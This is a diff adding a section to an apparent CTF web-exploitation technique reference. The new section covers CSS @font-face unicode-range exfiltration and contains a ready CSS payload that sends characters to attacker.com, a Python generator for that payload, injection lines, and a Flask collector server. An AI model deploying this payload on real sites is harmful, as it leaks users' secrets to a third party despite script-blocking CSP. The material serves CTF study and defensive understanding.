@@ -18,6 +18,7 @@ Unicode bypass, CSS-only exfiltration, behavioral JS frameworks, timing oracles,
 - [XSS Dot-Filter Bypass via Decimal IP and Bracket Notation (33C3 CTF 2016)](#xss-dot-filter-bypass-via-decimal-ip-and-bracket-notation-33c3-ctf-2016)
 - [XSS via Referer Header Injection (Tokyo Westerns 2017)](#xss-via-referer-header-injection-tokyo-westerns-2017)
 - [Java hashCode() Collision for Auth Bypass (CSAW 2017)](#java-hashcode-collision-for-auth-bypass-csaw-2017)
+- [CSS @font-face unicode-range Data Exfiltration (Harekaze CTF 2018)](#css-font-face-unicode-range-data-exfiltration-harekaze-ctf-2018)
 
 ---
 
@@ -508,3 +509,78 @@ def find_collision(target_str):
 **Key insight:** Java `hashCode()` produces trivial collisions due to its simple polynomial structure and 32-bit overflow. Never use it for security-sensitive comparisons (passwords, tokens, signatures). The collision space is dense — for most hash values, many short colliding strings exist. Use `hashCode()` only for hash table bucket assignment, never for equality/authentication checks.
 
 **Detection:** Java source using `password.hashCode() == storedHash`, token comparison via `token.hashCode()`, or any security check using `.hashCode()` instead of `equals()` with a secure hash (bcrypt, PBKDF2, etc.).
+
+---
+
+## CSS @font-face unicode-range Data Exfiltration (Harekaze CTF 2018)
+
+**Pattern:** Define a custom `@font-face` per character with a `unicode-range` that matches exactly one code point. When a headless browser (or admin bot) renders an element containing the target text, the browser fetches a different font URL for each character actually present. The attacker's server logs reveal which characters exist in the target element.
+
+```css
+/* Each @font-face triggers a fetch only if that character exists in .target */
+@font-face { font-family: exfil; src: url('http://attacker.com/leak?c=a'); unicode-range: U+0061; }
+@font-face { font-family: exfil; src: url('http://attacker.com/leak?c=b'); unicode-range: U+0062; }
+@font-face { font-family: exfil; src: url('http://attacker.com/leak?c=c'); unicode-range: U+0063; }
+@font-face { font-family: exfil; src: url('http://attacker.com/leak?c=0'); unicode-range: U+0030; }
+@font-face { font-family: exfil; src: url('http://attacker.com/leak?c=1'); unicode-range: U+0031; }
+/* ... one per character in the target alphabet ... */
+@font-face { font-family: exfil; src: url('http://attacker.com/leak?c=_'); unicode-range: U+005F; }
+@font-face { font-family: exfil; src: url('http://attacker.com/leak?c=%7B'); unicode-range: U+007B; } /* { */
+@font-face { font-family: exfil; src: url('http://attacker.com/leak?c=%7D'); unicode-range: U+007D; } /* } */
+
+/* Apply the font to the element containing the secret */
+.target { font-family: exfil; }
+```
+
+```python
+# Generate the full @font-face CSS payload
+import string
+
+charset = string.ascii_lowercase + string.digits + "_{}"
+css_rules = []
+for c in charset:
+    code_point = f"U+{ord(c):04X}"
+    encoded_c = c if c.isalnum() else f"%{ord(c):02X}"
+    css_rules.append(
+        f"@font-face {{ font-family: exfil; "
+        f"src: url('http://attacker.com/leak?c={encoded_c}'); "
+        f"unicode-range: {code_point}; }}"
+    )
+css_rules.append(".target { font-family: exfil; }")
+payload = "\n".join(css_rules)
+
+# Host as CSS file — MUST serve with Content-Type: text/css for cross-origin
+# Inject via: <link rel="stylesheet" href="http://attacker.com/exfil.css">
+# Or via CSS injection: <style>@import url('http://attacker.com/exfil.css');</style>
+```
+
+```python
+# Server-side: collect leaked characters
+from flask import Flask, request
+
+app = Flask(__name__)
+leaked_chars = set()
+
+@app.route('/leak')
+def leak():
+    c = request.args.get('c', '')
+    leaked_chars.add(c)
+    print(f"Leaked chars so far: {''.join(sorted(leaked_chars))}")
+    # Return a minimal valid font file (or 404 — the request itself is the leak)
+    return '', 204
+
+app.run(host='0.0.0.0', port=80)
+```
+
+**Limitations and workarounds:**
+```text
+# unicode-range leaks character SET, not order or count
+# Leaked: {a, c, f, g, l, _} from "flag_cfg" — no positional info
+
+# To recover ordering, combine with CSS positional tricks:
+# 1. Use ::first-letter with a unique font to leak position 1
+# 2. Use text-indent + overflow: hidden tricks to isolate characters
+# 3. Chain with :nth-child selectors if target chars are in separate elements
+```
+
+**Key insight:** CSS `@font-face` with `unicode-range` triggers font fetches only for characters actually present in the target element. Works under strict CSP that blocks scripts but allows `style-src`. Cross-origin CSS must include `Content-Type: text/css`. Leaks character set (not order), so combine with positional CSS tricks if ordering matters. See also the [CSS Font Glyph Width + Container Query Exfiltration](#css-font-glyph-width--container-query-exfiltration-unbreakable-2026) technique for a more precise CSS-only oracle.
